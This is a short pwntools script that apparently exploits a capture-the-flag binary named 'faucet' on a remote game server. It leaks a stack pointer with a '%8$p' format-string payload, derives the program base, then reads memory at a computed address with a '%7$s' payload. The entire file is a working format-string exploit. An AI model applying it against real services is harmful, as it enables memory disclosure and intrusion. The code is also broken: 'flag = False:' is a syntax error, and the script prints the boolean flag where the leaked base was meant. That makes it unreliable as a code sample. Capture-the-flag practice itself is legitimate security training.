from pwn import *
context.arch = 'amd64'
flag = False:
if flag:
	p = process("./faucet")
else:
	p = remote("challenge.ctf.games",31834)

p.recv()
p.sendline(b"5")
p.recv()
p.sendline(b"%8$p")
p.recvuntil(b"have bought a ")
base = int(p.recv(14),16) - 0x1740
print(hex(flag))

p.recv()
p.sendline(b"5")
p.recv()
payload = b"%7$s    "
payload += p64(base + 0x4060)

p.sendline(payload)
print(p.recv())
print(p.recv())
